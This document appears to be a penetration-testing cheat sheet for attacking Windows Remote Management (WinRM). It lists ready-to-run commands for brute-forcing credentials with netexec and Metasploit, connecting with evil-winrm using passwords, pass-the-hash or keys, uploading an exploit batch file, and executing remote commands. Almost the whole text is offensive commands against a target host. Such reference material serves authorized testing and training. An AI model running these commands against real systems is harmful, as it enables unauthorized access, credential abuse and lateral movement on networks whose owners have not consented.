## Enumeration

### Brute Force Credentials

```sh
netexec winrm <target-ip> -d DOMAIN -u usernames.txt -p passwords.txt 

# Metasploit
msfconsole
msf > use auxiliary/scanner/winrm/winrm_login
```

<br />

## Connect with Evil-WinRM

**[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)** is a Windows Remote Management shell for pentesting.  
Below are list of commands for each situation.

### Connect

```powershell
evil-winrm -i <target-ip> -u username -p password
# -P: Specifify port
evil-winrm -i <target-ip> -P 5986 -u username -p password

# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc

# PowerShell Local Path (-s)
evil-winrm -i <target-ip> -u username -p password -s /opt/scripts

# SSL enabled (-S)
evil-winrm -i <target-ip> -u username -p password -S
```

If you have private key and public key, you can use them for authentication.

```sh
# -S: SSL
# -k: private key
# -c: public key
evil-winrm -i <target-ip> -S -k private.key -c public.key
```

### Commands

After connecting, we can use a lot of useful commands to exploit.  
Note that **we need to specify the absolute path for uploading and downloading.**

```powershell
# Upload a local file to Windows machine
PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat
# Download a file to local
PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt

# List all services
PS> services
```

<br />

## Command Execution with NetExec

```sh
# -x: Execute a command
netexec winrm <target-ip> -d DOMAIN -u username -p password -x 'whoami'
netexec winrm <target-ip> -d DOMAIN -u username -p password -X '$PSVersionTable'

# -H: Login with Pass The Hash
netexec winrm <target-ip> -d DOMAIN -u username -H <HASH> -x 'whoami'
```
